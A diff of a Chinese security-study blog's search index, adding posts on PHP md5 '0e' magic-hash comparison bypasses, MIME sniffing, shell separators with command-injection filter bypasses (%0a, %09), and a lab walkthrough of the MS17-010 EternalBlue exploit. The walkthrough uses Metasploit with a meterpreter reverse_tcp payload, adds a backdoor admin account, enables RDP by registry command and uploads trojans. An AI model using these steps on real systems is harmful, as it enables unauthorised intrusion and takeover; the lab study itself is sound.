d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s1</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s2</span>)));</span><br><span class="line">var_dump(md5(urldecode(<span class="variable">$s3</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">32</span>) <span class="string">&quot;ea8b4156874b91a4ef00c5ca3e4a4a34&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="一个5位数和一个6位数的0e开头md5全数字的值"><a href="#一个5位数和一个6位数的0e开头md5全数字的值" class="headerlink" title="一个5位数和一个6位数的0e开头md5全数字的值"></a>一个5位数和一个6位数的0e开头md5全数字的值</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">byGcY</span><br><span class="line"><span class="number">0e591948146966052067035298880982</span></span><br><span class="line">sonZ7y</span><br><span class="line"><span class="number">0e463306343746311593316642162425</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="只包含一种字符的0e开头的md5值："><a href="#只包含一种字符的0e开头的md5值：" class="headerlink" title="只包含一种字符的0e开头的md5值："></a>只包含一种字符的0e开头的md5值：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>FVWc</span><br><span class="line"><span class="number">0</span>ef715f5943144181839f9f321584156</span><br><span class="line"><span class="number">2</span>uM8z</span><br><span class="line"><span class="number">0e0081018231</span>f666742748f3540f4761</span><br><span class="line"><span class="number">3</span>za1b</span><br><span class="line"><span class="number">0e02</span>f196724391824188f3f90f732735</span><br></pre></td></tr></table></figure>
+
+<h3 id="只包含两种字符的0e开头的md5值："><a href="#只包含两种字符的0e开头的md5值：" class="headerlink" title="只包含两种字符的0e开头的md5值："></a>只包含两种字符的0e开头的md5值：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span>c84</span><br><span class="line"><span class="number">0e17</span>d931d17f1948d37d691693995ff1</span><br><span class="line"><span class="number">01</span>bDI</span><br><span class="line"><span class="number">0</span>ee26113820055502806791698800f47</span><br><span class="line"><span class="number">01</span>NxP</span><br><span class="line"><span class="number">0e72096</span>d884f956d9618012679405269</span><br><span class="line"><span class="number">02</span>K7w</span><br><span class="line"><span class="number">0e543091322</span>e0f42ef1126374409f755</span><br><span class="line"><span class="number">04072</span></span><br><span class="line"><span class="number">0e8</span>f06d06387944ff396030861fd2698</span><br><span class="line"><span class="number">044</span>Dt</span><br><span class="line"><span class="number">0e91946379408</span>e6f2f62152293e4f596</span><br><span class="line"><span class="number">05</span>nnu</span><br><span class="line"><span class="number">0</span>ef580f7a2f4176f57544f8091f33936</span><br><span class="line"><span class="number">05</span>wPJ</span><br><span class="line"><span class="number">0e49528768</span>d18f101816843669079475</span><br></pre></td></tr></table></figure>
+
+<h3 id="下列的字符串的MD5值都是0e开头的："><a href="#下列的字符串的MD5值都是0e开头的：" class="headerlink" title="下列的字符串的MD5值都是0e开头的："></a>下列的字符串的<code>MD5</code>值都是<code>0e</code>开头的：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
+
+<p>为什么是以<code>0e</code>开头的<code>md5</code>值？(前提<code>==</code>号，而不是<code>===</code>)科学计数法中<code>0e123</code>和<code>0e456</code>是相同的，因为0乘以任何数都是<code>0</code>。</p>
+<ul>
+<li>== 两边值类型不同的时候，要先进行类型转换，再比较。</li>
+<li>=== 不做类型转换，类型不同的一定不等。</li>
+</ul>
+<p>转载自:<a href="https://blog.csdn.net/qq_42967398/article/details/104522626">https://blog.csdn.net/qq_42967398/article/details/104522626</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>一些小知识</title>
+    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h2 id="MIME是什么"><a href="#MIME是什么" class="headerlink" title="MIME是什么?"></a><code>MIME</code>是什么?</h2><p><code>MIME</code>意为多功能<code>Internet</code>邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。</p>
+<p>文件后缀名在网页上并没有明确的意义。 因此，使服务器设置正确的传输类型非常重要，所以正确的<code>MIME</code>类型与每个文件一同传输给服务器。在网络资源进行连接时，浏览器经常使用<code>MIME</code>类型来决定执行何种默认行为。</p>
+<span id="more"></span>
+
+<h2 id="MIME是什么-1"><a href="#MIME是什么-1" class="headerlink" title="MIME是什么?"></a><code>MIME</code>是什么?</h2><p><code>MIME</code>意为多功能<code>Internet</code>邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。</p>
 <p>文件后缀名在网页上并没有明确的意义。 因此，使服务器设置正确的传输类型非常重要，所以正确的<code>MIME</code>类型与每个文件一同传输给服务器。在网络资源进行连接时，浏览器经常使用<code>MIME</code>类型来决定执行何种默认行为。</p>
 <p>是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会<strong>自动使用</strong>指定应用程序来打开。多用于指定一些客户端<strong>自定义</strong>的文件名，以及一些媒体文件打开方式。</p>
 <h3 id="MIME嗅探"><a href="#MIME嗅探" class="headerlink" title="MIME嗅探"></a><code>MIME</code>嗅探</h3><p>在缺失<code> MIME</code> 类型或客户端认为文件设置了错误的 <code>MIME</code> 类型时，浏览器可能会通过查看资源来进行<code>MIME</code>嗅探。每一个浏览器在不同的情况下会执行不同的操作。因为这个操作会有一些安全问题，有的 <code>MIME </code>类型表示可执行内容而有些是不可执行内容。浏览器可以通过请求头 <code>Content-Type</code> 来设置 <code>X-Content-Type-Options</code> 以阻止<code>MIME</code>嗅探。</p>
@@ -156,6 +501,134 @@
 <li><p><code>===</code> 不做类型转换，类型不同的一定不等。</p>
 </li>
 </ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>管道符</title>
+    <url>/2022/01/06/%E6%9D%82%E9%A1%B9/%E7%AE%A1%E9%81%93%E7%AC%A6/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<h3 id="系统支持的管道符如下-Linux和windows一样-："><a href="#系统支持的管道符如下-Linux和windows一样-：" class="headerlink" title="系统支持的管道符如下(Linux和windows一样)："></a>系统支持的管道符如下(Linux和windows一样)：</h3><ol>
+<li><code>;</code>：执行完前面的语句再执行后面的语句。</li>
+<li><code>|</code>：显示后面语句的执行结果。</li>
+<li><code>||</code>：当前面的语句执行出错时，执行后面的语句。</li>
+<li><code>&amp;</code>：两条命令都执行，如果前面的语句为假则执行执行后面的语句，前面的语句可真可假。</li>
+<li><code>&amp;&amp;</code>：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句为真则两条命令都执行，前面的语句只能为真。</li>
+</ol>
+<p>如果禁用了<code>;</code>，<code>|</code>，<code>&amp;</code>可以使用换行符的<code>url</code>编码(<code>%0a</code>)来绕过(相当于直接执行下一题命令)。</p>
+<p>禁用空格(<code>%20</code>)可以使用制表符(<code>tab</code>)的<code>url</code>编码<code>%09</code>来绕过。</p>
+<p>禁用了<code>/</code>可以先用<code>cd</code>进入文件。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>MS17-010永恒之蓝的复现</title>
+    <url>/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
+    <content><![CDATA[<p>永恒之蓝是指2017年4月14日晚，黑客团体<code>Shadow Brokers</code>（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的<code>SMB</code>漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了<code>wannacry</code>勒索病毒，英国、俄罗斯、整个欧洲以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
+<span id="more"></span>
+
+<h1 id="MS17-010永恒之蓝-复现"><a href="#MS17-010永恒之蓝-复现" class="headerlink" title="MS17-010永恒之蓝 复现"></a>MS17-010永恒之蓝 复现</h1><h2 id="使用设备"><a href="#使用设备" class="headerlink" title="使用设备"></a>使用设备</h2><p><code>kali</code>攻击机(<code>ip</code>:192.168.3.28)，<code>windows7</code>受害机(<code>ip</code>:192.168.3.105)</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>用<code>nmap</code>扫一下端口:<code>nmap -sV 192.168.3.105</code></p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119141021754.png" class="" title="image-20211119141021754">
+
+<p>发现445端口开放的。</p>
+<p>然后漏洞脚本检测(有点慢，按回车可以看到进度):<code>nmap --script=vuln 192.168.3.105</code></p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119141845637.png" class="" title="image-20211119141845637">
+
+<p>发现可以利用<code>MS17-010</code>漏洞</p>
+<p>开启<code>msf</code>:<code>msfconsole</code></p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119142051646.png" class="" title="image-20211119142051646">
+
+<p>查找合适的<code>MS17-010</code>模块，输入<code>search ms17-010</code></p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119142232878.png" class="" title="image-20211119142232878">
+
+<p>选用命令执行漏洞的模块<code>use 0</code></p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119143655730.png" class="" title="image-20211119143655730">
+
+<p>设置<code>rhost</code>(攻击者的<code>ip</code>)，<code>rhost</code>(受害者的<code>ip</code>)，查看攻击设置(<code>show options</code>)</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119143821733.png" class="" title="image-20211119143821733">
+
+<p>设置木马(可查看有那些木马)</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119143953170.png" class="" title="image-20211119143953170">
+
+<p>我们选用方向连接木马</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119144239521.png" class="" title="image-20211119144239521">
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<p>如果报错可以<code>show options</code>一下(因为我之前做过一次，所以报错了，在<code>options</code>里面可以看到<code>payload</code>已经配置的是这个了)</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119144744642.png" class="" title="image-20211119144744642">
+
+<p>输入<code>exploit</code>就可以攻击了</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119145334936.png" class="" title="image-20211119145334936">
+
+<p>这里发送了一点小问题，攻击失败了，因为<code>windows</code>这边开启了: 限制对命名管道和共享的匿名访问，我们把他关掉</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119145636384.png" class="" title="image-20211119145636384">
+
+<p>然后输入<code>exit</code>退出，再攻击</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119150019797.png" class="" title="image-20211119150019797">
+
+<p>这种情况就是攻击成功了</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119150817893.png" class="" title="image-20211119150817893">
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>输入<code>shell</code>进入命令执行</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119151010674.png" class="" title="image-20211119151010674">
+
+<p>执行一下简单的命令</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119151415147.png" class="" title="image-20211119151415147">
+
+<p>能写入文件(<code>windows</code>下打开文件是<code>type</code>)</p>
+<p>接下来可以提权，先新建一个用户</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user two admin123 /add</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119151629903.png" class="" title="image-20211119151629903">
+
+<p>提升为管理员权限</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119152119745.png" class="" title="image-20211119152119745">
+
+<p>我们在<code>windows</code>这边来验证一下</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119152620064.png" class="" title="image-20211119152620064">
+
+<p>这里可以看出<code>two</code>的权限提升到<code>Administrators</code>，而<code>one</code>没有(<code>one</code>是为了验证重新按照<code>two</code>创建的方式创建的，但是没有提权)</p>
+<p>有管理员用户了，然后我们可以开启3389端口(如果没开启的话)，进行远程连接操作。</p>
+<p>开启3389 :</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p>关闭3389 :</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre></td></tr></table></figure>
+
+<p>查看当前的端口<code>netstat -ano</code></p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119152940850.png" class="" title="image-20211119152940850">
+
+<p>发现并没有3389端口，我们尝试使用命令将他打开</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119153141906.png" class="" title="image-20211119153141906">
+
+<p>进行远程连接，<code>Win+R:mstsc</code></p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119153324367.png" class="" title="image-20211119153324367">
+
+<p>输入<code>ip</code>、用户名和密码</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119153419851.png" class="" title="image-20211119153419851">
+
+<p>我这里虚拟机出了点问题，重启了虚拟机，<code>ip</code>变了但是不影响，重新操作一下就行了。</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119154329606.png" class="" title="image-20211119154329606">
+
+<p>因为<code>windows7</code>虚拟机挂着的，我这边登录就会挤掉另一边。</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119154435490.png" class="" title="image-20211119154435490">
+
+<p>确定就行，然后就成功连接了</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119154553452.png" class="" title="image-20211119154553452">
+
+<p>除了远程连接也可以，上传木马程序，这里上传两个文件。</p>
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119195658082.png" class="" title="image-20211119195658082">
+
+<img src="/2022/01/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/MS17-010%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/image-20211119195716745.png" class="" title="image-20211119195716745">
+
+
+
+<p>参考文章:</p>
+<p><a href="https://blog.csdn.net/G_Fu_Q/article/details/109548277">https://blog.csdn.net/G_Fu_Q/article/details/109548277</a></p>
+<p><a href="https://www.jianshu.com/p/1adbabecdcbd">https://www.jianshu.com/p/1adbabecdcbd</a></p>
 ]]></content>
   </entry>
 </search>
